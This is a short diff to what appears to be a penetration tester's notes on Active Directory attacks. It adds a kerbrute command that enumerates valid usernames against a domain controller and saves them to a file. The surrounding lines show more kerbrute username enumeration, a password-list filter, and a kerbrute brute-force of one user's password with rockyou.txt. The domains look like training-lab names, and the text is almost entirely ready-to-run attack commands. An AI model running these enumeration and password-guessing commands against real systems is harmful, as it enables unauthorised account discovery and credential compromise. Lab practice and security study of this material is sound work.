@@ -79,6 +79,8 @@ cat mut_password.list | awk 'length($0) >= 8 && length($0) <= 20' > final.list
 # Valid Usernames
 ./kerbrute userenum --dc 192.168.0.239 -d warzone.oxsium.local /home/sako/Special-Tools/Active-Directory/username-anarchy/users_wordlist
 
+/usr/local/bin/kerbrute userenum --dc 172.16.7.3 -d inlanefreight.local xato-net-10-million-usernames-dup.txt | grep "VALID USERNAME:" | awk '{print $NF}' > users.txt
+
 # Password Brute Force
 ./kerbrute bruteuser --dc 192.168.0.239 -d warzone.oxsium.local /usr/share/wordlists/rockyou.txt jkimmich
 
